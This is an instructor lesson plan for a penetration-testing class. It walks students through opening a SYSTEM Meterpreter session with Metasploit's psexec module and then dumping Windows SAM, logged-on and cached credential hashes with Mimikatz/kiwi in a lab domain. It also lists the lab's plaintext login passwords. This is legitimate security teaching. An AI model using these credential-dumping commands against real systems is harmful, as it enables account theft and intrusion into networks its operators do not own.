### 17.3 Lesson Plan: Windows Persistence, Lateral Movement, Credential Access, and Review

## Overview
In today's class, students will finish the second penetration testing module by establishing persistence on a Windows
machine, laterally moving to the domain controller, and accessing the database where Active Directory credentials are
stored. The day will finish with a review of the pen testing modules using a service called Kahoot!.

## Class Objectives
By the end of class, students will be able to
- Understand how Windows credentials and Mimikatz work
- Perform lateral movement to other machines in a network
- Explain what DC replication is and how to use the DCSync attack

## Instructor Notes
It's important for students to strictly follow directions and use the given paths, payload names, etc. for activities. This
will prevent confusion when things do not work properly.

## Lab Environment
For this module, you will use the **Pen testing 2** lab environment located in Windows Azure Lab Services. RDP into the
Windows RDP Host machine using the following credentials:

- RDP login credentials for labs provisioned prior to 9/12/23
Username: azadmin
Password: p4ssw0rd*

- RDP login credentials for labs provisioned after 9/12/23
Username: azadmin
Password: p@ssw0rdp@ssw0rd

The credentials to the Hyper-V VMs are as follows:

Virtual Machine Username Password
Kali             root      kali
Metasploitable2 msfadmin cybersecurity
Windows 10 .\Administrator Topsecret!
WINDC01 Administrator Topsecret!

**NOTE:** To prevent the WINDC01 machine from rebooting due to expired license run the following from CMD as
Administrator: slmgr.vbs /rearm

## Slideshow
The lesson slides are available on Google Drive here: 17.3 Slides.
**Note**: Editing access is not available for this document. If you or your students wish to modify the slides, please
create a copy by navigating to **File > Make a copy**.

## Student Guide
Share the student-facing version of this lesson plan after class: 17.3 Student Guide.

## Mimikatz and Kiwi
Introduce Mimikatz and Kiwi by covering the following:
**Mimikatz** is a Windows-purposed credential dumping tool that is able to decrypt almost all stored credentials in Windows. It is outside the scope of our class to go into details on how Mimikatz works.
For our class, we will use the Metasploit version of Mimikatz called kiwi.
Note, this tool is called kiwi in Metasploit because the creator of Mimikatz, Benjamin Delpy, goes by the handle GentleKiwi.
Explain to the class that we will now conduct a demonstration on how to use kiwi.

## Mimikatz Demonstration
First, open a Meterpreter session as SYSTEM on WIN10 by performing the following steps (if a current Meterpreter
SYSTEM session isn't already opened).

1. Load the psexec module: use exploit/windows/smb/psexec

2. Set the following parameters:
   - set RHOSTS 172.22.117.20
   - set SMBUSER tstark
   - set SMBPass Password!
   - set SMBDomain megacorpone
   - set LHOST 172.22.117.100

3. Run the module with run .
Even though we set the credentials to tstark , the PSExec module in Metasploit will always open a session as SYSTEM due to how it executes the payload via service creation.

4. In your Meterpreter session, enable the Mimikatz modules by typing load kiwi
Metasploit and Meterpreter both have the ability to load add-ons such as kiwi . When a new add-on is loaded, the help menu is updated with commands from the new add-on.

5. Next, show all the options available for the kiwi modules with the command ? , as the image shows:

Inform students that since kiwi is an adaptation of Mimikatz, the commands are slightly different.
For example, in Mimikatz, the command sekurlsa::kerberos (pronounced "secure LSA" or "secure local
security authority") will list all Kerberos credentials on the machine. In kiwi , this command is
creds_kerberos .

6. Start by demonstrating the command lsa_dump_sam to dump the contents of SAM. Explain to students that there's a lot of output here, some of which is not important. The most important field is User, Hash NTLM as highlighted in the image below.
This field contains the NTLM hash for that user

7. Another way of obtaining hashes is through the creds_all command with kiwi . This parses the output neatly

Note: If you do not get any results with creds_all , you most likely need to migrate to a x64 SYSTEM process.
Inform students that this command will look for credentials in several areas of Windows and dump them. Note that SAM is not included in creds_all . Most likely, the credentials obtained through creds_all will come
from currently logged in users. We can see from the output that pparker has their password hash dumped,
because they are logged onto the machine.

8. Explain that one additional area that creds_all doesn't cover is cached credentials. Remember that Windows caches credentials when a user logs on. Unfortunately, this command doesn't exist in kiwi . Luckily, we can run actual Mimikatz commands in kiwi via the kiwi_cmd command.

9. . Run the following command to demonstrate kiwi_cmd :
       kiwi_cmd lsadump::sam

Explain to students that this output is the same as lsa_dump_sam . In the upcoming activity, they will have to use kiwi_cmd to find the cached credentials.

## 02. Student Do: Credential Dumping Activity

Explain the following to students:
- In this activity, you will continue to play the role of a pen tester conducting an engagement on MegaCorpOne.You are tasked to use the Metasploit kiwi extension to dump the credentials that are cached on the WIN10
machine.
- Then you will save and crack the hashes using john .
- Send students the following file:
- Activity File: Credential Dumping
- Answer any questions before students start the activity.

   


